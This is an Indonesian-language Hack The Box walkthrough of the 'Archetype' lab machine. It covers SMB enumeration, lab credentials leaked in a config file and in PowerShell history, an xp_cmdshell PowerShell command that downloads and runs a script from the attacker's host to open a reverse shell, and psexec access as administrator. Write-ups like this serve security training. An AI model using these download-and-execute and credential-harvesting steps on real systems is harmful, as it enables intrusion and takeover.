# Archetype HTB

Pertama kita menjalankan nmap 

```sh
nmap -A -T4 -p- -oN nmap 10.10.10.27
```

sudah mendapatkan port untuk smbnya yaitu pada port 445 yang merupakan port untuk `smb`. 
Dengan command smbmap : 

```s
smbmap -H 10.10.10.27 -u " " -p " "
```

Didapatkan hasil

```
Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote Admin
backups                                                 READ ONLY
C$                                                      NO ACCESS       Default share
IPC$                                                    READ ONLY       Remote IPC

```

Kita ketahui disini kita punya /backups dan juga IPC$ yang memiliki permissions read. IPC digunakan untuk koneksi antar prosesnya sedangkan backups sebagai sebuah direktori pada smb servicenya. Kita bisa melihat file yang terdapat dalam smb ini dengan command smbclient.

```s
smbclient //10.10.10.27/backups
```

Dan didalamnya terdapat file `prod.dtsConfig`. Dengan command `get prod.dtsConfig` kita bisa mendownload file tersebut. Dalam OS kita dan bisa dilihat isinya dengan gampang. isi dari prod.dtsConfig adalah : 

```xml
DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

Dimana kita mendapatkan beberapa poin penting yaitu user id `ARCHETYPE\sql_svc` dan password `M3g4c0rp123` untuk terkoneksi dengan sql service mereka kita mengggunakan command : 

```shell 
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 
```

Untuk mendapatkan reverse shell kita perlu mengetahui ip publik kita dengan command `ifconfig` dan ip publik berada pada tun1

```
tun1: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.7  netmask 255.255.254.0  destination 10.10.14.7
        inet6 dead:beef:2::1005  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::3ace:a795:db7f:3c4d  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 83489  bytes 3443464 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 84245  bytes 5087974 (4.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Dengan command dibawah ini kita bisa mendapatkan reverse shell dari service kita.

```
xp_cmdshell "powershell IEX (New-Object System.Net.WebClient).DownloadString(\"http://10.10.14.7:8000/re.ps1\");"

```

setelahnya flag berada pada `C:\users\sql_svc\Desktop\user.txt`. Setelah mendapat flag user kita coba membuka bash history pada powershell windows pada direktori `C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`. isi dari historynya : 


```shell
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

coba terhubung dengan windows menggunakan semacam 'ssh' namun pada windows kita menggunakan tools psexec.py dengan command : 

```s
python3 /home/kali/.local/bin/psexec.py administrator@10.10.10.27
```

Dannn didapatkan root.txt pada `/Administrator/Desktop` 


## Done!